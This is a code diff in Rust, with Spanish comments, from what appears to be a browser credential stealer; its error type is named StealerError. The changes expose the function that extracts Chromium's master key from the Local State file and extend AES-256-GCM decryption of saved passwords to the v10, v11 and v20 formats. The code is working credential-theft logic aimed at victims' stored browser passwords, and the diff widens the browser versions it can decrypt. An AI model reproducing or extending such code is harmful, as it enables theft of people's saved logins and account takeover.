@@ -85,7 +85,7 @@ fn copy_db_to_temp(db_path: &PathBuf) -> StealerResult<PathBuf> {
 }
 
 /// Extrae la master key del archivo Local State
-fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
+pub fn extract_master_key(local_state_path: &PathBuf) -> StealerResult<Option<Vec<u8>>> {
     // Leer el archivo JSON
     let content = std::fs::read_to_string(local_state_path)
         .map_err(|e| StealerError::IoError(e.to_string()))?;
@@ -220,19 +220,24 @@ fn extract_credentials_from_db(
 }
 
 /// Desencripta un password usando AES-256-GCM
-fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<String> {
-    // Chromium v80+ formato: [v10/v11][12 bytes nonce][encrypted data][16 bytes tag]
+/// Soporta formatos: v10, v11, v20
+pub fn decrypt_aes_gcm_bytes(encrypted_data: &[u8], master_key: &[u8]) -> Option<Vec<u8>> {
+    // Chromium v80+ formato: [v10/v11/v20][12 bytes nonce][encrypted data][16 bytes tag]
     if encrypted_data.len() < 3 {
-        return Err(StealerError::InvalidData);
+        return None;
     }
     
-    // Verificar prefijo
-    if &encrypted_data[0..3] != b"v10" && &encrypted_data[0..3] != b"v11" {
-        return Err(StealerError::InvalidData);
+    // Verificar prefijo (v10, v11, v20)
+    let is_valid_prefix = &encrypted_data[0..3] == b"v10" 
+        || &encrypted_data[0..3] == b"v11"
+        || &encrypted_data[0..3] == b"v20";
+    
+    if !is_valid_prefix {
+        return None;
     }
     
     if encrypted_data.len() < 3 + 12 + 16 {
-        return Err(StealerError::InvalidData);
+        return None;
     }
     
     // Extraer componentes
@@ -240,14 +245,16 @@ fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<St
     let ciphertext_with_tag = &encrypted_data[15..]; // resto (encrypted + 16 bytes tag)
     
     // Crear cipher
-    let cipher = Aes256Gcm::new_from_slice(master_key)
-        .map_err(|_| StealerError::DecryptionFailed)?;
-    
+    let cipher = Aes256Gcm::new_from_slice(master_key).ok()?;
     let nonce = Nonce::clone_from_slice(nonce_bytes);
     
     // Desencriptar
-    let plaintext = cipher.decrypt(&nonce, ciphertext_with_tag)
-        .map_err(|_| StealerError::DecryptionFailed)?;
+    cipher.decrypt(&nonce, ciphertext_with_tag).ok()
+}
+
+fn decrypt_aes_gcm(encrypted_data: &[u8], master_key: &[u8]) -> StealerResult<String> {
+    let plaintext = decrypt_aes_gcm_bytes(encrypted_data, master_key)
+        .ok_or(StealerError::DecryptionFailed)?;
     
     String::from_utf8(plaintext)
         .map_err(|_| StealerError::InvalidData)
